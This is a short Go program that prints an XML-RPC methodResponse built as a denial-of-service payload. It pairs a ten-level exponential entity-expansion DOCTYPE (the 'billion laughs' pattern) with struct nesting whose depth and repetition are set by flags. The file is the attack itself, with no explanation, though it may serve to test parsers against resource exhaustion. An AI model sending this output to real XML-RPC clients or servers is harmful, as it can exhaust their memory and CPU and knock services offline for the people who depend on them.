package main

import (
	"flag"
	"fmt"
)

var iter = flag.Int("iter", 1000, "Iterations (repetitions) to generate")
var depth = flag.Int("depth", 1000, "Depth (nesting) of each iteration")

func main() {
	flag.Parse()
	fmt.Print(`<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE rpcz [
 <!ENTITY rpc "rpc">
 <!ENTITY rpc1 "&rpc;&rpc;&rpc;&rpc;&rpc;&rpc;&rpc;&rpc;&rpc;&rpc;">
 <!ENTITY rpc2 "&rpc1;&rpc1;&rpc1;&rpc1;&rpc1;&rpc1;&rpc1;&rpc1;&rpc1;&rpc1;">
 <!ENTITY rpc3 "&rpc2;&rpc2;&rpc2;&rpc2;&rpc2;&rpc2;&rpc2;&rpc2;&rpc2;&rpc2;">
 <!ENTITY rpc4 "&rpc3;&rpc3;&rpc3;&rpc3;&rpc3;&rpc3;&rpc3;&rpc3;&rpc3;&rpc3;">
 <!ENTITY rpc5 "&rpc4;&rpc4;&rpc4;&rpc4;&rpc4;&rpc4;&rpc4;&rpc4;&rpc4;&rpc4;">
 <!ENTITY rpc6 "&rpc5;&rpc5;&rpc5;&rpc5;&rpc5;&rpc5;&rpc5;&rpc5;&rpc5;&rpc5;">
 <!ENTITY rpc7 "&rpc6;&rpc6;&rpc6;&rpc6;&rpc6;&rpc6;&rpc6;&rpc6;&rpc6;&rpc6;">
 <!ENTITY rpc8 "&rpc7;&rpc7;&rpc7;&rpc7;&rpc7;&rpc7;&rpc7;&rpc7;&rpc7;&rpc7;">
 <!ENTITY rpc9 "&rpc8;&rpc8;&rpc8;&rpc8;&rpc8;&rpc8;&rpc8;&rpc8;&rpc8;&rpc8;">
 <!ENTITY rpc10 "&rpc9;&rpc9;&rpc9;&rpc9;&rpc9;&rpc9;&rpc9;&rpc9;&rpc9;&rpc9;">
]>
<methodResponse>
  <params>`)
	for i := 0; i < *iter; i++ {
		fmt.Print(`<param><value>`)
		for j := 0; j < *depth; j++ {
			fmt.Print(`<struct><member><name>&rpc1;</name><value>`)
		}
		fmt.Print(`<string>&rpc1;</string>`)
		for j := 0; j < *depth; j++ {
			fmt.Print(`</value></member></struct>`)
		}
		fmt.Print(`</value></param>`)
	}
	fmt.Print(`
  </params>
</methodResponse>`)

}
